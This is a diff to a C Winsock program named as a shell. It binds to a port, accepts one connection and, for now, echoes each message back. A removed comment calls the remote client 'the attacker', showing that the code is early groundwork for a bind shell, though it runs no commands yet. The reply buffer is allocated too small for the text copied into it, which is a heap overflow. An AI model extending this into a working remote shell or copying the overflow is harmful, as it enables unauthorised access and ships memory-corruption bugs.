@@ -33,9 +33,6 @@ int main(){
     #ifdef IP
         strcpy(ip, xstr(IP));
     #endif
-    
-    printf("Port: %d\n", port);
-    printf("IP: %s\n", ip);
 
     startShell();
 
@@ -49,6 +46,10 @@ Return values:
     1 - exited with error
 */
 int startShell() {
+    printf("Starting shell with the following settings:\n");
+    printf("Port: %d\n", port);
+    printf("IP: %s\n", ip);
+
     // initialize winsock
     WSADATA wsData;
     WORD version = MAKEWORD(2,2);
@@ -69,11 +70,12 @@ int startShell() {
     struct sockaddr_in hint; // a hint structure (?)
     hint.sin_family = AF_INET;
     hint.sin_port = htons(port);
-    hint.sin_addr.S_un.S_addr = INADDR_ANY; //same thing as the inet_pton line - tells to use any address
+    hint.sin_addr.S_un.S_addr = INADDR_ANY; //same thing as the inet_pton line - tells to use any address (could set to use only the ip address given...)
     bind(sock, (struct sockaddr*)&hint, sizeof(hint));
 
     // tell winsock the socker for meant to listen for incoming connections
     listen(sock, SOMAXCONN);
+    printf("Listening for incoming connection...");
 
     // wait for a connection
     struct sockaddr_in client;
@@ -91,27 +93,25 @@ int startShell() {
     // don't need the listening socket because now we have the connected socket
     closesocket(sock);
 
-    // FOR TESTING JUST ECHO MESSAGE BACK TO THE ATTACKER
-
     char buf[4096];
     while (TRUE){
         memset(buf, 0, sizeof(buf));
-        int bytesRec = recv(clientSocket, buf, 4096, 0); // this function returns the length of the message in bytes
-        if (bytesRec == SOCKET_ERROR){
+        int bytesRecv = recv(clientSocket, buf, 4096, 0); // this function returns the length of the message in bytes
+        if (bytesRecv == SOCKET_ERROR){
             printf("Error recieving data. Exiting...\n");
             break;
-        } else if (bytesRec == 0){
+        } else if (bytesRecv == 0){
             printf("Client disconnected. Exiting...\n");
             break;
         }
 
-        char * reply = (char*)calloc(bytesRec, sizeof(char));
+        char * reply = (char*)calloc(bytesRecv, sizeof(char));
         strcpy(reply, "You said: ");
         strcat(reply, buf);
         strcat(reply, "\n");
 
         // send message back to the client
-        send(clientSocket, reply, bytesRec + 1, 0);
+        send(clientSocket, reply, bytesRecv + 1, 0);
     
     }
     
